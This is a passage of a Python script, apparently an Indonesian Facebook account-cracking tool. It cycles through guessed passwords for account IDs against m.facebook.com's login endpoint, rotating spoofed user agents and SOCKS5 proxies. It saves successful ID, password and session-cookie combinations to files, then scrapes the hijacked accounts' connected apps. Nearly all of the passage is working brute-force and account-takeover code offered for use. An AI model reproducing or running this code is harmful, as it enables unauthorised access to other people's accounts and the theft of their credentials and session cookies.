        'Mozilla/5.0 (Linux; Android 8.1.0; vivo 1820 Build/O11019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36 VivoBrowser/5.9.3.81',
        'Mozilla/5.0 (Linux; Android 11; vivo 1907; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36 VivoBrowser/6.9.6.5',
        'Mozilla/5.0 (Web0S; Linux/SmartTV) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.34 Safari/537.36 DMOST/1.0.1 (; LGE; webOSTV; WEBOS4.1.0 04.10.40; W4_lm18a;)',
        'Mozilla/5.0 (Linux; Android 10; V1965A; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/13.2.0.0',
        'Mozilla/5.0 (Linux; Android 4.4.2; vivo Y11 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mobile Safari/537.36'
])
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks5://'+nip}
			ses.headers.update({'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.facebook.com/v2.3/dialog/oauth?app_id=124024574287414&cbt=1651658200978&e2e=%7B%22init%22%3A1651658200978%7D&sso=chrome_custom_tab&scope=email&state=%7B%220_auth_logger_id%22%3A%2268f15bae-23f8-463c-8660-5cf1226d97f6%22%2C%227_challenge%22%3A%22dahj28hqtietmhrgprpp%22%2C%223_method%22%3A%22custom_tab%22%7D&redirect_uri=fbconnect%3A%2F%2Fcct.com.instathunder.app&response_type=token%2Csigned_request%2Cgraph_domain%2Cgranted_scopes&return_scopes=true&ret=login&fbapp_pres=0&logger_id=68f15bae-23f8-463c-8660-5cf1226d97f6&tp=unspecified","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r{x}└──{k} {idf}|{pw} •{b}{tahun(idf)}{x}\n└──{m} {ua}{N}')     
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				headapp={"SupportsFresco=1 Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J210F Build/MMB29Q) Source/1 [FBAN/EMA;UNITY_PACKAGE/342;FBBV/107586706;FBAV/172.0.0.8.182;FBDV/SM-J210F;FBLC/id_ID;FBOP/20]"}
				if 'no' in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					print(f'\r{x}└──{H} {idf}|{pw} •{b}{tahun(idf)}{x}\n└──{H} {kuki}{x}\n└──{m} {ua}{N}')
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					break
				elif 'ya' in taplikasi:
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					user=idf
					infoakun = ""
					session = requests.Session()
					cek2 = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies=coki,headers=headapp).text
					cek =session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies=coki,headers=headapp).text
					apkaktif=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek))
					nok=1
					for muncul in apkaktif:
						infoakun+= (f"	{x}[{h}{nok}{x}] {b}{muncul[0]} {muncul[1]}{x}\n")
						nok+=1

					hit=0
					apkexp=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek2))
					hit=0
					for muncul in apkexp:
						hit+=1
						infoakun += (f"	{x}[{k}{hit}{x}] {m}{muncul[0]} {muncul[1]}{x}\n")
					print(f'\r{x}└──{H} {idf}|{pw} •{b}{tahun(idf)}{x}\n└──{H} {kuki}{x}\n└──{m} {ua}\n{infoakun}{x}')
					ok+=1
					break

			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(1)
	loop+=1
	

###>[ MENGECEK APLIKASI ]<###
def cek_apk(session,cookie):
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":cookie}).text
	sop = BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	if len(game)==0:
		print(f"\n {N}[{M}!{N}] opshh tidak ada aplikasi aktif di akun ini.")
	else:
		for i in range(len(game)):
			print("   %s%s. %s%s"%(H,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":cookie}).text
	sop = BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	if len(game)==0:
		print(f"\n {N}[{M}!{N}] opshh tidak ada aplikasi kadaluarsa di akun ini.")
	else:
		for i in range(len(game)):
			print("   %s%s. %s%s"%(K,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))

###>[ KONTROL ]<###
if __name__=='__main__':
	try:os.system('git pull')
	except:pass
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.mkdir('/sdcard/RIZKI378-DATA')
	except:pass
	try:os.system('touch .prox.txt')
	except:pass
	try:os.system('clear')
	except:pass
	rizki378_tamvan(f'\n\t{x}• {h}MALING SEWAJAR NYA AJH\n\t{x}• {k}BENAR TUGAS KITA HANYA MENGHIBUR ORANG,\n\t{x}• {h}TAPI SULIT MENGHIBUR DIRI SENDIRI :)\n\t{x}• {k}IG: king_robot_of\n\t{x}• {h}FB: MUHAMAD RIZKI\n\t{x}• {k}Wellcome To BEKASI{x}')
	time.sleep(3)
	login()